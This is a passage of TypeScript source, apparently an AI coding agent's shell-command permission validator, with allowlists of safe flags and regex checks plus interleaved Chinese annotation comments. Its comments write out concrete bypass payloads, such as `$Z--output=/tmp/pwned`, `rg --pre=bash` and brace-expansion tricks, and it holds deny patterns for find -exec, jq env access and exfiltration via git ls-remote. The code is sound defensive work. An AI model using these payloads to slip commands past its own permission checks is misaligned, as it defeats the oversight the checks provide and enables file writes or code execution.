      '--older': 'string',
      '-P': 'string',
      '--parent': 'string',
      '-s': 'string',
      '--session': 'string',
      '-t': 'string',
      '--terminal': 'string',
      '-u': 'string',
// /dev/null 白名单直通——它只是丢弃输出。
      '--euid': 'string',
      '-U': 'string',
      '--uid': 'string',
      '-x': 'none',
      '--exact': 'none',
      '-F': 'string',
      '--pidfile': 'string',
      '-L': 'none',
      '--logpidfile': 'none',
      '-r': 'string',
      '--runstates': 'string',
      '--ns': 'string',
      '--nslist': 'string',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },

  tput: {
    safeFlags: {
      '-T': 'string',
      '-V': 'none',
      '-x': 'none',
      // SECURITY: -S (read capability names from stdin) deliberately EXCLUDED.
      // It must NOT be in safeFlags because validateFlags unbundles combined
      // short flags (e.g., -xS → -x + -S), but the callback receives the raw
      // token '-xS' and only checks exact match 'token === "-S"'. Excluding -S
      // from safeFlags ensures validateFlags rejects it (bundled or not) before
      // the callback runs. The callback's -S check is defense-in-depth.
    },
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // Capabilities that modify terminal state or could be harmful.
      // init/reset run iprog (arbitrary code from terminfo) and modify tty settings.
      // rs1/rs2/rs3/is1/is2/is3 are the individual reset/init sequences that
      // init/reset invoke internally — rs1 sends ESC c (full terminal reset).
      // clear erases scrollback (evidence destruction). mc5/mc5p activate media copy
      // (redirect output to printer device). smcup/rmcup manipulate screen buffer.
      // pfkey/pfloc/pfx/pfxl program function keys — pfloc executes strings locally.
      // rf is reset file (analogous to if/init_file).
      const DANGEROUS_CAPABILITIES = new Set([
        'init',
        'reset',
        'rs1',
        'rs2',
        'rs3',
        'is1',
        'is2',
        'is3',
        'iprog',
        'if',
        'rf',
        'clear',
        'flash',
        'mc0',
        'mc4',
// checkPathConstraints 是总入口：先查重定向，再逐个子命令查路径。
        'mc5',
        'mc5i',
        'mc5p',
        'pfkey',
        'pfloc',
        'pfx',
        'pfxl',
        'smcup',
        'rmcup',
      ])
      const flagsWithArgs = new Set(['-T'])
      let i = 0
      let afterDoubleDash = false
      while (i < args.length) {
        const token = args[i]!
        if (token === '--') {
// 进程替换 >(cmd) 能在重定向目标之外执行命令写文件：`echo secret > >(tee .git/config)` 的 tee 根本不以重定向面貌出现。正则版查这个；AST 版不查——process_substitution 已在 DANGEROUS_TYPES 里更早被拒。
          afterDoubleDash = true
          i++
        } else if (!afterDoubleDash && token.startsWith('-')) {
          // Defense-in-depth: block -S even if it somehow passes validateFlags
          if (token === '-S') return true
          // Also check for -S bundled with other flags (e.g., -xS)
          if (
            !token.startsWith('--') &&
            token.length > 2 &&
            token.includes('S')
          )
            return true
          if (flagsWithArgs.has(token)) {
            i += 2
          } else {
            i++
          }
        } else {
          if (DANGEROUS_CAPABILITIES.has(token)) return true
// 有 AST 重定向就用 AST 的：shell-quote 单引号反斜杠 bug 会把 `>` 搅进 token（且解析成功，fail-closed 不触发），AST 已正确解出目标。
          i++
        }
      }
      return false
    },
  },

  // ss — socket statistics (iproute2). Read-only query tool equivalent to netstat.
  // SECURITY: -K/--kill (forcibly close sockets) and -D/--diag (dump raw data to file)
  // are deliberately excluded. -F/--filter (read filter from file) also excluded.
// 重定向目标含 $VAR / %VAR% 时目标不可静态确定 → ask。AST 路径恒 false（checkSemantics 已验过）。
  ss: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
      '-n': 'none',
      '--numeric': 'none',
      '-r': 'none',
      '--resolve': 'none',
      '-a': 'none',
      '--all': 'none',
      '-l': 'none',
      '--listening': 'none',
      '-o': 'none',
      '--options': 'none',
      '-e': 'none',
      '--extended': 'none',
      '-m': 'none',
      '--memory': 'none',
      '-p': 'none',
      '--processes': 'none',
// 有 AST 命令列表就直接遍历 argv；否则退回 splitCommand_DEPRECATED + shell-quote 重解析。两条路都只把 ask/deny 上抛，passthrough 继续看下一条。
      '-i': 'none',
      '--info': 'none',
      '-s': 'none',
      '--summary': 'none',
      '-4': 'none',
      '--ipv4': 'none',
      '-6': 'none',
      '--ipv6': 'none',
      '-0': 'none',
      '--packet': 'none',
      '-t': 'none',
      '--tcp': 'none',
      '-M': 'none',
      '--mptcp': 'none',
      '-S': 'none',
      '--sctp': 'none',
      '-u': 'none',
      '--udp': 'none',
      '-d': 'none',
      '--dccp': 'none',
      '-w': 'none',
      '--raw': 'none',
      '-x': 'none',
      '--unix': 'none',
      '--tipc': 'none',
      '--vsock': 'none',
      '-f': 'string',
      '--family': 'string',
      '-A': 'string',
      '--query': 'string',
      '--socket': 'string',
      '-Z': 'none',
      '--context': 'none',
      '-z': 'none',
      '--contexts': 'none',
      // SECURITY: -N/--net EXCLUDED — performs setns(), unshare(), mount(), umount()
      // to switch network namespace. While isolated to forked process, too invasive.
      '-b': 'none',
      '--bpf': 'none',
// AST 重定向 → 校验器格式的适配层。>&N（纯数字）是 fd 复制不是写文件；>&file 才是 &>file 的 deprecated 形式。
      '-E': 'none',
      '--events': 'none',
      '-H': 'none',
      '--no-header': 'none',
      '-O': 'none',
      '--oneline': 'none',
      '--tipcinfo': 'none',
      '--tos': 'none',
      '--cgroup': 'none',
      '--inet-sockopt': 'none',
      // SECURITY: -K/--kill EXCLUDED — forcibly closes sockets
      // SECURITY: -D/--diag EXCLUDED — dumps raw TCP data to a file
      // SECURITY: -F/--filter EXCLUDED — reads filter expressions from a file
    },
  },

  // fd/fdfind — fast file finder (fd-find). Read-only search tool.
  // SECURITY: -x/--exec (execute command per result) and -X/--exec-batch
  // (execute command with all results) are deliberately excluded.
  fd: { safeFlags: { ...FD_SAFE_FLAGS } },
  // fdfind is the Debian/Ubuntu package name for fd — same binary, same flags
  fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },
// fd 复制与文件重定向的区分：>&10 复制 fd，>&foo 写文件。

  ...PYRIGHT_READ_ONLY_COMMANDS,
  ...DOCKER_READ_ONLY_COMMANDS,
}

// gh commands are ant-only since they make network requests, which goes against
// the read-only validation principle of no network access
const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  // All gh read-only commands from shared validation map
  ...GH_READ_ONLY_COMMANDS,
  // aki — Anthropic internal knowledge-base search CLI.
  // Network read-only (same policy as gh). --audit-csv omitted: writes to disk.
  aki: {
    safeFlags: {
      '-h': 'none',
      '--help': 'none',
      '-k': 'none',
      '--keyword': 'none',
      '-s': 'none',
// 这段横幅是全文件最重要的运维注释。**bashPermissions.ts 里那份窄版 stripWrappers 是死代码但不能删**——那个模块正好卡在 Bun feature() DCE 复杂度阈值上，删约 80 行会让 feature('BASH_CLASSIFIER') 静默失效（PR #21503 round 3 实测：基线 30/30，删后 22/30）。三处 wrapper 剥离（本文件 / bashPermissions / checkSemantics）必须同步，不同步 = checkSemantics 剥了壳做语义检查、路径校验看到的是壳 → passthrough → 包装里的命令从未被路径校验。
      '--semantic': 'none',
      '--no-adaptive': 'none',
      '-n': 'number',
      '--limit': 'number',
      '-o': 'number',
      '--offset': 'number',
      '--source': 'string',
      '--exclude-source': 'string',
      '-a': 'string',
      '--after': 'string',
      '-b': 'string',
      '--before': 'string',
      '--collection': 'string',
      '--drive': 'string',
      '--folder': 'string',
      '--descendants': 'none',
      '-m': 'string',
      '--meta': 'string',
      '-t': 'string',
      '--threshold': 'string',
      '--kw-weight': 'string',
      '--sem-weight': 'string',
// timeout 旗标值的白名单正则：信号是 TERM/KILL/9，时长是 5/5s/10.5。原先用 [^ \t]+ 匹配，`timeout -k$(id) 10 ls` 这种命令替换能混过去。
      '-j': 'none',
      '--json': 'none',
      '-c': 'none',
      '--chunk': 'none',
      '--preview': 'none',
      '-d': 'none',
      '--full-doc': 'none',
      '-v': 'none',
      '--verbose': 'none',
// skipTimeoutFlags 返回「时长 token」的下标。解析不了返回 -1，调用方 fail-closed。
      '--stats': 'none',
      '-S': 'number',
      '--summarize': 'number',
      '--explain': 'none',
      '--examine': 'string',
      '--url': 'string',
      '--multi-turn': 'number',
      '--multi-turn-model': 'string',
      '--multi-turn-context': 'string',
      '--no-rerank': 'none',
      '--audit': 'none',
      '--local': 'none',
      '--staging': 'none',
    },
  },
}

function getCommandAllowlist(): Record<string, CommandConfig> {
  let allowlist: Record<string, CommandConfig> = COMMAND_ALLOWLIST
  // On Windows, xargs can be used as a data-to-code bridge: if a file contains
  // a UNC path, `cat file | xargs cat` feeds that path to cat, triggering SMB
  // resolution. Since the UNC path is in file contents (not the command string),
  // regex-based detection cannot catch this.
  if (getPlatform() === 'windows') {
    const { xargs: _, ...rest } = allowlist
    allowlist = rest
  }
  if (process.env.USER_TYPE === 'ant') {
    return { ...allowlist, ...ANT_ONLY_COMMAND_ALLOWLIST }
  }
  return allowlist
}

/**
 * Commands that are safe to use as xargs targets for auto-approval.
 *
 * SECURITY: Only add a command to this list if it has NO flags that can:
 * 1. Write to files (e.g., find's -fprint, sed's -i)
 * 2. Execute code (e.g., find's -exec, awk's system(), perl's -e)
 * 3. Make network requests
 *
 * These commands must be purely read-only utilities. When xargs uses one of
 * these as a target, we stop validating flags after the target command
 * (see the `break` in isCommandSafeViaFlagParsing), so the command itself
 * must not have ANY dangerous flags, not just a safe subset.
 *
 * Each command was verified by checking its man page for dangerous capabilities.
 */
const SAFE_TARGET_COMMANDS_FOR_XARGS = [
  'echo', // Output only, no dangerous flags
  'printf', // xargs runs /usr/bin/printf (binary), not bash builtin — no -v support
  'wc', // Read-only counting, no dangerous flags
  'grep', // Read-only search, no dangerous flags
  'head', // Read-only, no dangerous flags
  'tail', // Read-only (including -f follow), no dangerous flags
]
// skipEnvFlags 拒 -S（argv 分割器）、-C/-P（换工作目录/路径）——这三个都能改变后面命令的语义环境。

/**
 * Unified command validation function that replaces individual validator functions.
 * Uses declarative configuration from COMMAND_ALLOWLIST to validate commands and their flags.
 * Handles combined flags, argument validation, and shell quoting bypass detection.
 */
export function isCommandSafeViaFlagParsing(command: string): boolean {
  // Parse the command to get individual tokens using shell-quote for accuracy
  // Handle glob operators by converting them to strings, they don't matter from the perspective
  // of this function
  const parseResult = tryParseShellCommand(command, env => `$${env}`)
  if (!parseResult.success) return false

  const parsed = parseResult.tokens.map(token => {
    if (typeof token !== 'string') {
      token = token as { op: 'glob'; pattern: string }
      if (token.op === 'glob') {
        return token.pattern
      }
    }
    return token
  })

  // If there are operators (pipes, redirects, etc.), it's not a simple command.
  // Breaking commands down into their constituent parts is handled upstream of
  // this function, so we reject anything with operators here.
  const hasOperators = parsed.some(token => typeof token !== 'string')
  if (hasOperators) {
    return false
  }

// timeout 的时长用 strtod 语义：.5 / +5 / inf 都是 GNU timeout 合法时长但旧正则拒了它们。拒不了就原样返回——checkSemantics 对同样输入 fail-closed 且先跑，到不了这里。
  // Now we know all tokens are strings
  const tokens = parsed as string[]

  if (tokens.length === 0) {
    return false
  }
// nice 的历史 bug：只剥 `nice -n N` 时，`nice rm /outside` 基名是 nice → passthrough → /outside 从未路径校验。补上裸 `nice cmd` 和 legacy `nice -N cmd`。

  // Find matching command configuration
  let commandConfig: CommandConfig | undefined
  let commandTokens: number = 0

  // Check for multi-word commands first (e.g., "git diff", "git stash list")
  const allowlist = getCommandAllowlist()
  for (const [cmdPattern] of Object.entries(allowlist)) {
    const cmdTokens = cmdPattern.split(' ')
    if (tokens.length >= cmdTokens.length) {
// stdbuf 是 PR 加宽的。PR 前 `stdbuf -o0 -eL rm` 被 fragment check 拦（旧 slice(2) 把 -eL 当名字）；PR 后 checkSemantics 剥两个旗标放行，但本函数没同步剥 → 基名 stdbuf → passthrough。两边必须一起改。
      let matches = true
      for (let i = 0; i < cmdTokens.length; i++) {
        if (tokens[i] !== cmdTokens[i]) {
          matches = false
          break
        }
      }
      if (matches) {
// env 同理：checkSemantics 剥 env 本函数不剥，包装的命令就漏校验。
        commandConfig = allowlist[cmdPattern]
        commandTokens = cmdTokens.length
        break
      }
    }
  }

  if (!commandConfig) {
    return false // Command not in allowlist
  }

  // Special handling for git ls-remote to reject URLs that could lead to data exfiltration
// git ls-remote 的 URL 特判：它能把本地仓库数据推到远端（外泄通道），所以参数里出现 ://、@、:、$ 一律拒。
  if (tokens[0] === 'git' && tokens[1] === 'ls-remote') {
    // Check if any argument looks like a URL or remote specification
    for (let i = 2; i < tokens.length; i++) {
      const token = tokens[i]
      if (token && !token.startsWith('-')) {
        // Reject HTTP/HTTPS URLs
        if (token.includes('://')) {
          return false
        }
        // Reject SSH URLs like git@github.com:user/repo.git
        if (token.includes('@') || token.includes(':')) {
          return false
        }
        // Reject variable references
        if (token.includes('$')) {
          return false
        }
      }
    }
  }

  // SECURITY: Reject ANY token containing `$` (variable expansion). The
  // `env => \`$${env}\`` callback at line 825 preserves `$VAR` as LITERAL TEXT
  // in tokens, but bash expands it at runtime (unset vars → empty string).
  // This parser differential defeats BOTH validateFlags and callbacks:
  //
  //   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
  //       (starts with `$`) falls through as positional at ~:1730. Bash runs
  //       `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
  //
  //   (2) `$VAR`-prefix → RCE via `rg --pre`:
  //       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
  //       no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
  //
  //   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
  //       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
  //       `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
  //       tokens would NOT close this.
  //
  // We check ALL tokens after the command prefix. Any `$` means we cannot
  // determine the runtime token value, so we cannot verify read-only safety.
  // This check must run BEFORE validateFlags and BEFORE callbacks.
// 全 token 禁 `$` 是 parser differential 的补丁：shell-quote 的回调把 $VAR 原样保留成字面 token，但 bash 运行时展开它（未设变量 → 空串）。这一个差异同时打穿 validateFlags 和 callback：(1) `$Z--output=/tmp/pwned` 以 $ 开头不当旗标当位置参数，bash 展开成 --output 写任意文件；(2) rg 没有 regex 没有 callback，`rg . "$Z--pre=bash" FILE` 一步 RCE；(3) `ps ax"$Z"e` 的中缀 $ 让 BSD-e 检测正则失明。所以位置参数里任何 $ 都拒——值不可静态确定，只读性就无法证明。
  for (let i = commandTokens; i < tokens.length; i++) {
    const token = tokens[i]
    if (!token) continue
    // Reject any token containing $ (variable expansion)
    if (token.includes('$')) {
      return false
    }
    // Reject tokens with BOTH `{` and `,` (brace expansion obfuscation).
    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote strips quotes
    // → token `{@{0},--output=/tmp/pwned}` has `{` + `,` → brace expansion.
    // This is defense-in-depth with validateBraceExpansion in bashSecurity.ts.
    // We require BOTH `{` and `,` to avoid false positives on legitimate
    // patterns: `stash@{0}` (git ref, has `{` no `,`), `{{.State}}` (Go
    // template, no `,`), `prefix-{}-suffix` (xargs, no `,`). Sequence form
    // `{1..5}` also needs checking (has `{` + `..`).
// 花括号展开混淆也要挡：`git diff @{'{'}0},--output=/tmp/pwned}` 剥引号后 token 含 { 和 ,。要求 { 与 ,（或 ..）同时出现才拦，避开 stash@{0}（git ref）、{{.State}}（Go 模板）、prefix-{}-suffix（xargs）这些合法形态。
    if (token.includes('{') && (token.includes(',') || token.includes('..'))) {
      return false
    }
  }

  // Validate flags starting after the command tokens
  if (
    !validateFlags(tokens, commandTokens, commandConfig, {
      commandName: tokens[0],
      rawCommand: command,
      xargsTargetCommands:
        tokens[0] === 'xargs' ? SAFE_TARGET_COMMANDS_FOR_XARGS : undefined,
    })
  ) {
    return false
  }

  if (commandConfig.regex && !commandConfig.regex.test(command)) {
// 三层收尾：有 regex 的命令必须匹配；没 regex 的命令禁反引号（命令替换）；grep/rg 禁模式里的换行（注入通道）。
    return false
  }
  if (!commandConfig.regex && /`/.test(command)) {
    return false
  }
  // Block newlines and carriage returns in grep/rg patterns as they can be used for injection
  if (
    !commandConfig.regex &&
    (tokens[0] === 'rg' || tokens[0] === 'grep') &&
    /[\n\r]/.test(command)
  ) {
    return false
  }
  if (
    commandConfig.additionalCommandIsDangerousCallback &&
    commandConfig.additionalCommandIsDangerousCallback(
      command,
      tokens.slice(commandTokens),
    )
  ) {
    return false
  }

  return true
}

/**
 * Creates a regex pattern that matches safe invocations of a command.
 *
 * The regex ensures commands are invoked safely by blocking:
 * - Shell metacharacters that could lead to command injection or redirection
 * - Command substitution via backticks or $()
 * - Variable expansion that could contain malicious payloads
 * - Environment variable assignment bypasses (command=value)
 *
 * @param command The command name (e.g., 'date', 'npm list', 'ip addr')
 * @returns RegExp that matches safe invocations of the command
 */
// makeRegexForSafeCommand 生成的模板：命令名后只许「空白 + 无 shell 元字符的串」。<>()$`|{}&; 和换行全禁——它们分别对应重定向、命令替换、变量展开、管道、后台、语句分隔。
function makeRegexForSafeCommand(command: string): RegExp {
  // Create regex pattern: /^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
  return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
}

// Simple commands that are safe for execution (converted to regex patterns using makeRegexForSafeCommand)
// WARNING: If you are adding new commands here, be very careful to ensure
// they are truly safe. This includes ensuring:
// 1. That they don't have any flags that allow file writing or command execution
// 2. Use makeRegexForSafeCommand() to ensure proper regex pattern creation
// READONLY_COMMANDS 是「简单命令」名单：无旗标需要精细校验，整命令正则即可覆盖。echo 单独一条（引号内换行允许，双引号内禁 $）。
const READONLY_COMMANDS = [
  // Cross-platform commands from shared validation
  ...EXTERNAL_READONLY_COMMANDS,

  // Unix/bash-specific read-only commands (not shared because they don't exist in PowerShell)

  // Time and date
  'cal',
  'uptime',

  // File content viewing (relative paths handled separately)
  'cat',
  'head',
  'tail',
  'wc',
  'stat',
  'strings',
  'hexdump',
  'od',
  'nl',

  // System info
  'id',
  'uname',
  'free',
  'df',
  'du',
  'locale',
  'groups',
  'nproc',

  // Path information
  'basename',
  'dirname',
  'realpath',

  // Text processing
  'cut',
  'paste',
  'tr',
  'column',
  'tac', // Reverse cat — displays file contents in reverse line order
  'rev', // Reverse characters in each line
  'fold', // Wrap lines to specified width
  'expand', // Convert tabs to spaces
  'unexpand', // Convert spaces to tabs
  'fmt', // Simple text formatter — output to stdout only
  'comm', // Compare sorted files line by line
  'cmp', // Byte-by-byte file comparison
  'numfmt', // Number format conversion

  // Path information (additional)
  'readlink', // Resolve symlinks — displays target of symbolic link

  // File comparison
  'diff',

  // true and false, used to silence or create errors
  'true',
  'false',

  // Misc. safe commands
  'sleep',
  'which',
  'type',
  'expr', // Evaluate expressions (arithmetic, string matching)
  'test', // Conditional evaluation (file checks, comparisons)
  'getconf', // Get system configuration values
  'seq', // Generate number sequences
  'tsort', // Topological sort
  'pr', // Paginate files for printing
]

// Complex commands that require custom regex patterns
// Warning: If possible, avoid adding new regexes here and prefer using COMMAND_ALLOWLIST
// instead. This allowlist-based approach to CLI flags is more secure and avoids
// vulns coming from gnu getopt_long.
const READONLY_COMMAND_REGEXES = new Set([
  // Convert simple commands to regex patterns using makeRegexForSafeCommand
  ...READONLY_COMMANDS.map(makeRegexForSafeCommand),

  // Echo that doesn't execute commands or use variables
  // Allow newlines in single quotes (safe) but not in double quotes (could be dangerous with variable expansion)
  // Also allow optional 2>&1 stderr redirection at the end
  /^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/,

  // Claude CLI help
  /^claude -h$/,
  /^claude --help$/,

  // Git readonly commands are now handled via COMMAND_ALLOWLIST with explicit flag validation
  // (git status, git blame, git ls-files, git config --get, git remote, git tag, git branch)
// git 只读子命令已迁去 allowlist 做旗标校验，这里只留注释说明迁移方向。

  /^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // Only allow flags, no input/output files

  // System info
  /^pwd$/,
  /^whoami$/,
  // env and printenv removed - could expose sensitive environment variables
// env/printenv 被移除——会吐敏感环境变量。

  // Development tools version checking - exact match only, no suffix allowed.
  // SECURITY: `node -v --run <task>` would execute package.json scripts because
  // Node processes --run before -v. Python/python3 --version are also anchored
  // for defense-in-depth. These were previously in EXTERNAL_READONLY_COMMANDS which
  // flows through makeRegexForSafeCommand and permits arbitrary suffixes.
// node -v 精确锚定的原因：`node -v --run <task>` 会执行 package.json 脚本（Node 先处理 --run 再处理 -v）。python --version 同理钉死。这些原先在 EXTERNAL_READONLY_COMMANDS 里走 makeRegexForSafeCommand，允许任意后缀。
  /^node -v$/,
  /^node --version$/,
  /^python --version$/,
  /^python3 --version$/,

  // Misc. safe commands
  // tree command moved to COMMAND_ALLOWLIST for proper flag validation (blocks -o/--output)
  /^history(?:\s+\d+)?\s*$/, // Only allow bare history or history with numeric argument - prevents file writing
  /^alias$/,
  /^arch(?:\s+(?:--help|-h))?\s*$/, // Only allow arch with help flags or no arguments

  // Network commands - only allow exact commands with no arguments to prevent network manipulation
// 网络命令只放行精确形态：ip addr 不许带参（带参可改路由/地址），ifconfig 只许接口名。
  /^ip addr$/, // Only allow "ip addr" with no additional arguments
  /^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // Allow ifconfig with interface name only (must start with letter)

  // JSON processing with jq - allow with inline filters and file arguments
  // File arguments are validated separately by pathValidation.ts
  // Allow pipes and complex expressions within quotes but prevent dangerous flags
  // Block command substitution - backticks are dangerous even in single quotes for jq
  // Block -f/--from-file, --rawfile, --slurpfile (read files into jq), --run-tests, -L/--library-path (load executable modules)
  // Block 'env' builtin and '$ENV' object which can access environment variables (defense in depth)
// jq 正则是手工写的例外。禁 -f/--from-file（读脚本文件）、--rawfile/--slurpfile、--run-tests、-L/--library-path（加载可执行模块）、env/$ENV（读环境变量）。引号内禁反引号——jq 里反引号同样危险。
  /^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests|-L\b|--library-path|\benv\b|\$ENV\b))(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*(?:\s+'[^'`]*'|\s+"[^"`]*"|\s+[^-\s'"][^\s]*)+\s*$/,

  // Path commands (path validation ensures they're allowed)
  // cd command - allows changing to directories
  /^cd(?:\s+(?:'[^']*'|"[^"]*"|[^\s;|&`$(){}><#\\]+))?$/,
  // ls command - allows listing directories
  /^ls(?:\s+[^<>()$`|{}&;\n\r]*)?$/,
  // find command - blocks dangerous flags
  // Allow escaped parentheses \( and \) for grouping, but block unescaped ones
  // NOTE: \\[()] must come BEFORE the character class to ensure \( is matched as an escaped paren,
  // not as backslash + paren (which would fail since paren is excluded from the character class)
// find 正则的黑名单写法：-delete/-exec/-execdir/-ok/-okdir/-fprint/-fls/-fprintf 全部负向前查禁掉。转义圆括号 \( 要排在字符类之前匹配，否则被当成「反斜杠 + 圆括号」而失配。
  /^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
])

/**
 * Checks if a command contains glob characters (?, *, [, ]) or expandable `$`
 * variables OUTSIDE the quote contexts where bash would treat them as literal.
 * These could expand to bypass our regex-based security checks.
 *
 * Glob examples:
 * - `python *` could expand to `python --help` if a file named `--help` exists
 * - `find ./ -?xec` could expand to `find ./ -exec` if such a file exists
 * Globs are literal inside BOTH single and double quotes.
 *
 * Variable expansion examples:
 * - `uniq --skip-chars=0$_` → `$_` expands to last arg of previous command;
 *   with IFS word splitting, this smuggles positional args past "flags-only"
 *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → FILE WRITE.
 * - `cd "$HOME"` → double-quoted `$HOME` expands at runtime.
 * Variables are literal ONLY inside single quotes; they expand inside double
 * quotes and unquoted.
 *
 * The `$` check guards the READONLY_COMMAND_REGEXES fallback path. The `$`
 * token check in isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
 * commands; hand-written regexes like uniq's `\S+` and cd's `"[^"]*"` allow `$`.
 * Matches `$` followed by `[A-Za-z_@*#?!$0-9-]` covering `$VAR`, `$_`, `$@`,
 * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` —
 * those are caught by COMMAND_SUBSTITUTION_PATTERNS in bashSecurity.ts.
 *
 * @param command The command string to check
 * @returns true if the command contains unquoted glob or expandable `$`
 */
// containsUnquotedExpansion 守卫的是正则回退路径：命令里引号外的 glob 与 $ 变量在运行时会展开成什么无法预知，正则匹配的文本与 bash 真正执行的文本可能完全不同。
function containsUnquotedExpansion(command: string): boolean {
// containsUnquotedExpansion 函数体：状态机跟踪引号。两个真实攻击样例：`uniq --skip-chars=0$_` 借 IFS 分词把位置参数偷渡过「只许旗标」的正则；`cd "$HOME"` 双引号内变量照样展开。单引号外 everywhere 都要查。
  // Track quote state to avoid false positives for patterns inside quoted strings
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const currentChar = command[i]

    // Handle escape sequences
    if (escaped) {
      escaped = false
      continue
    }

    // SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,
    // `\` inside `'...'` is LITERAL — it does not escape the next character.
    // Without this guard, `'\'` desyncs the quote tracker: the `\` sets
    // escaped=true, then the closing `'` is consumed by the escaped-skip
    // instead of toggling inSingleQuote. Parser stays in single-quote
    // mode for the rest of the command, missing ALL subsequent expansions.
    // Example: `ls '\' *` — bash sees glob `*`, but desynced parser thinks
    // `*` is inside quotes → returns false (glob NOT detected).
    // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns
    // before this function is reached, but we fix the tracker anyway for
    // consistency with the correct implementations in bashSecurity.ts.
// 单引号内的反斜杠在 bash 里是字面量、不转义。如果不加 `!inSingleQuote` 守卫，`ls '\' *` 会让引号跟踪器错位：\ 吃掉后面的闭引号，解析器停在单引号态，把 glob * 当成引号内字面量漏过去。
    if (currentChar === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    // Update quote state
    if (currentChar === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }

    if (currentChar === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    // Inside single quotes: everything is literal. Skip.
    if (inSingleQuote) {
      continue
    }

    // Check `$` followed by variable-name or special-parameter character.
    // `$` expands inside double quotes AND unquoted (only SQ makes it literal).
// $ 后跟变量名字符（含 $_ $@ $* $# $? $! $$ $- $0-$9）才算展开；${ 和 $( 不在这里管——那两种由 bashSecurity 的命令替换模式负责。
    if (currentChar === '$') {
      const next = command[i + 1]
      if (next && /[A-Za-z_@*#?!$0-9-]/.test(next)) {
        return true
      }
    }

    // Globs are literal inside double quotes too. Only check unquoted.
// glob 只在双引号外和单引号外展开；双引号内是字面量。
    if (inDoubleQuote) {
      continue
    }

    // Check for glob characters outside all quotes.
    // These could expand to anything, including dangerous flags.
    if (currentChar && /[?*[\]]/.test(currentChar)) {
      return true
    }
  }

  return false
}

/**
 * Checks if a single command string is read-only based on READONLY_COMMAND_REGEXES.
 * Internal helper function that validates individual commands.
 *
 * @param command The command string to check
 * @returns true if the command is read-only
 */
// isCommandReadOnly 是单命令的只读判定入口：2>&1 尾巴先切掉（管道组件常带这个），UNC 路径早退，glob/$ 早退，然后 allowlist 优先、正则为辅。
function isCommandReadOnly(command: string): boolean {
  // Handle common stderr-to-stdout redirection pattern
  // This handles both "command 2>&1" at the end of a full command
  // and "command 2>&1" as part of a pipeline component
  let testCommand = command.trim()
  if (testCommand.endsWith(' 2>&1')) {
    // Remove the stderr redirection for pattern matching
    testCommand = testCommand.slice(0, -5).trim()
  }

  // Check for Windows UNC paths that could be vulnerable to WebDAV attacks
  // Do this early to prevent any command with UNC paths from being marked as read-only
  if (containsVulnerableUncPath(testCommand)) {
// UNC 路径（\\host\share）在 Windows 上会触发 SMB/WebDAV 解析，可能被诱导回连到攻击者主机，任何带 UNC 的命令都不许自动放行。
    return false
  }

  // Check for unquoted glob characters and expandable `$` variables that could
  // bypass our regex-based security checks. We can't know what these expand to
  // at runtime, so we can't verify the command is read-only.
  //
  // Globs: `python *` could expand to `python --help` if such a file exists.
  //
  // Variables: `uniq --skip-chars=0$_` — bash expands `$_` at runtime to the
  // last arg of the previous command. With IFS word splitting, this smuggles
  // positional args past "flags-only" regexes like uniq's `\S+`. The `$` token
  // check inside isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
  // commands; hand-written regexes in READONLY_COMMAND_REGEXES (uniq, jq, cd)
  // have no such guard. See containsUnquotedExpansion for full analysis.
  if (containsUnquotedExpansion(testCommand)) {
    return false
  }

  // Tools like git allow `--upload-pack=cmd` to be abbreviated as `--up=cmd`
  // Regex filters can be bypassed, so we use strict allowlist validation instead.
  // This requires defining a set of known safe flags. Claude can help with this,
  // but please look over it to ensure it didn't add any flags that allow file writes
  // code execution, or network requests.
// 先 allowlist 后正则的注释解释了为什么：git 允许 --upload-pack=cmd 缩写为 --up=cmd，正则防不住缩写，只有显式旗标白名单能。
  if (isCommandSafeViaFlagParsing(testCommand)) {
    return true
  }

  for (const regex of READONLY_COMMAND_REGEXES) {
// 正则命中后的三道 git 补丁：-c（内联任意 config，core.fsmonitor/diff.external/core.gitProxy 都能执行命令）、--exec-path（换 git 可执行文件目录）、--config-env（从环境变量注入 config，与 -c 同危）。
    if (regex.test(testCommand)) {
